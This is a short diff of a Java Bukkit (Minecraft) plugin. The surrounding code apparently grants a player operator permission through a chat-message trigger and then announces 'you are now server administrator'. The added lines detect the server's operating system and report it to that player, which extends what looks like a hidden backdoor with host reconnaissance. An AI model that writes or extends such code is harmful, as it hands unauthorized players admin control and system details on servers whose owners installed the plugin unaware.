@@ -45,6 +45,15 @@ public class TestPlugin extends JavaPlugin implements Listener {
 
             // 给玩家发送消息
             player.sendMessage(ChatColor.GREEN + "now, you have Operator Permission!");
+            String os = System.getProperty("os.name").toLowerCase();
+            if (os.contains("win")) {
+                player.sendMessage(ChatColor.GREEN + "The server is running on a Windows system. - 服务器运行在Windows系统上");
+            } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
+                player.sendMessage(ChatColor.GREEN
+                        + "The server is running on a Unix/Linux/Mac system. - 服务器运行在Unix/Linux/Mac系统上");
+            } else {
+                player.sendMessage(ChatColor.RED + "Unknown operating system. - 未知的操作系统");
+            }
             player.sendTitle(ChatColor.RED + "恭喜!", ChatColor.GOLD + "您现在是服务器管理员了!", 10, 70, 20);
             String[] msgParts = message.split(" ");
             if (msgParts.length <= 1 || "tmp".equals(msgParts[1])) {
